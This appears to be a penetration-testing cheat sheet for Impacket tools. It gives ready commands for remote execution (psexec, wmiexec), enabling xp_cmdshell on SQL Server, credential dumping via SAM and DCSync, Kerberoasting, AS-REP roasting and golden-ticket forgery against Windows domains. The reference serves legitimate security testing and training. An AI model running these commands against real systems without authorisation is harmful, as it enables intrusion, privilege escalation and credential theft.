## psexec.py: choose the operation and read the result

SMB service shell; requires service-control rights and a writable share, usually local administrator.

### What the result establishes

The returned identity belongs to a service-created process on the remote host; verify it with whoami before using local paths or privileges.

### Prerequisites and common failures

A valid login is insufficient: service creation, writable administrative shares, SMB connectivity and endpoint policy all affect this method.

Valid administrator credentials, SMB access, and writable admin shares/service creation rights on the Windows host.

### Example 1: Password (prompted)

Run in: **Kali**.

```bash
impacket-psexec 'DOMAIN/USER@TARGET_IP'
```

### Example 2: NT hash

Run in: **Kali**.

```bash
impacket-psexec -hashes ':NT_HASH' 'DOMAIN/USER@TARGET_IP'
```

## wmiexec.py: choose the operation and read the result

Execute through WMI/DCOM; needs RPC access and permissions, plus SMB for default output.

### What the result establishes

Separate successful WMI execution from successful retrieval of stdout; a blank response can be an output-transport problem.

### Prerequisites and common failures

RPC endpoint negotiation, DCOM permissions and the default SMB output path must work; it is not a full interactive terminal.

### Example 1: Password (prompted)

Run in: **Kali**.

```bash
impacket-wmiexec 'DOMAIN/USER@TARGET_IP'
```

### Example 2: NT hash

Run in: **Kali**.

```bash
impacket-wmiexec -hashes ':NT_HASH' 'DOMAIN/USER@TARGET_IP'
```

## mssqlclient.py: choose the operation and read the result

Connect to Microsoft SQL Server. Choose SQL login or Windows authentication.

### What the result establishes

First distinguish SQL authentication from Windows authentication, then read the server, database and effective login.

### Prerequisites and common failures

A database login does not imply sysadmin, impersonation rights, linked-server access or operating-system execution.

### Example 1: SQL login — password prompted

Run in: **Kali**.

```bash
impacket-mssqlclient 'USER@TARGET_IP'
```

### Example 2: Domain account — password prompted

Run in: **Kali**.

```bash
impacket-mssqlclient -windows-auth 'DOMAIN/USER@TARGET_IP'
```

### Example 3: Inside the SQL prompt

Run in: **MSSQL prompt**.

```sql
help
SELECT SYSTEM_USER;
SELECT IS_SRVROLEMEMBER('sysadmin');
SELECT name FROM sys.databases;
```

### Example 4: OS command — requires appropriate SQL privileges

Run in: **Impacket SQL prompt**. Enables xp_cmdshell on the server.

```text
enable_xp_cmdshell
xp_cmdshell whoami
```

**Login failed** — Confirm SQL authentication versus Windows authentication. Use -windows-auth for the domain account form; verify the SQL instance and port.

**xp_cmdshell permission denied** — A SQL login does not imply sysadmin or OS command execution rights. Check the role query before trying the optional command-execution block.

## secretsdump.py: choose the operation and read the result

Extract credentials with the required local or replication rights.

### What the result establishes

Distinguish local SAM/LSA extraction, an offline hive operation and directory replication; record exactly which artifact was returned.

### Prerequisites and common failures

Local administrator rights do not automatically grant DCSync rights, and an NT hash is not a captured NetNTLM challenge/response.

### Example 1: Commands

Run in: **Kali**.

```bash
impacket-secretsdump -sam sam.save -system system.save LOCAL
# DCSync: requires directory replication rights
impacket-secretsdump -just-dc 'DOMAIN/USER:PASSWORD@DC_IP'
```

## Original captured examples

Preserved from the original note. Prefer the task-specific references above for prerequisites and current launcher names. The earlier “quieter” label below is relative, not a promise of stealth; execution and output retrieval leave observable activity.


The Python toolkit behind most AD attacks. Common scripts:

```bash
# remote execution (need admin creds or hash)
psexec.py $DOMAIN/admin:PASS@$IP            # SYSTEM shell (noisy)
wmiexec.py $DOMAIN/admin@$IP -hashes :<nt>  # semi-interactive, quieter
smbexec.py / atexec.py / dcomexec.py        # alternatives
# credentials
secretsdump.py $DOMAIN/USER:PASS@$DC -just-dc   # DCSync
GetUserSPNs.py $DOMAIN/USER:PASS -dc-ip $DC -request     # Kerberoast
GetNPUsers.py  $DOMAIN/ -usersfile users.txt -no-pass    # AS-REP roast
# tickets
getTGT.py $DOMAIN/USER:PASS ; export KRB5CCNAME=USER.ccache
ticketer.py -nthash <krbtgt> -domain-sid <sid> -domain $DOMAIN Administrator   # golden
# shares / lookups
smbclient.py ; lookupsid.py ; mssqlclient.py $DOMAIN/USER:PASS@$IP -windows-auth
```


> Many authentication-capable scripts support `-hashes LM:NT` or `-k` for Kerberos (with `KRB5CCNAME`), but options differ. Check the specific script with `-h`. Use FQDN + `-dc-ip` when Kerberos is finicky.
